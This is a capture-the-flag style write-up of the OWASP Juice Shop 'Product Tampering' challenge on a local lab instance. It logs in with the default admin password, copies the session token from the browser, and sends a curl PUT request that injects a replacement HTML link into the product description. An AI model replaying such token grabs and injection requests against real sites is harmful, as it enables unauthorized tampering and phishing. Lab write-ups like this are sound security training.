# Product Tampering: Change the href of the Link Within the O-Saft Product Description

**Objective:** Change the `href` of the link within the O-Saft product's description.

## Steps Taken

### 1. Logged in as admin and retrieved a fresh JWT

Logged in with the default admin account (`admin@juice-sh.op` / `admin123`), then copied the token from `localStorage` via the browser Console:

```javascript
copy(localStorage.getItem('token'))
```

Saved it to `~/token.txt` in Kali.

### 2. Found the product's database ID

Queried the REST search endpoint:

```bash
curl -s "http://localhost:3000/rest/products/search?q=o-saft"
```

Result confirmed O-Saft's database ID is `9`, and that its description already contains a link:

```json
"description":"...<a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More ...</a>"
```

### 3. Sent a PUT request to tamper with the product description

```bash
TOKEN=$(cat ~/token.txt)
curl -s -X PUT http://localhost:3000/api/Products/9 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}'
```

### 4. Verified the result

The response confirmed success:

```json
{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"<a href=\"https://owasp.slack.com\" target=\"_blank\">More ... </a>", ...}}
```

The description's link `href` was changed from `https://www.owasp.org/index.php/O-Saft` to `https://owasp.slack.com`.

## Result

Challenge solved — confirmed on the Score Board.

## Root Cause

The product update endpoint (`PUT /api/Products/:id`) accepts arbitrary field updates — including raw HTML in the `description` field — from any client holding a valid (in this case, admin) authentication token, with no restriction on which links or markup can be injected.

## Status

Solved.
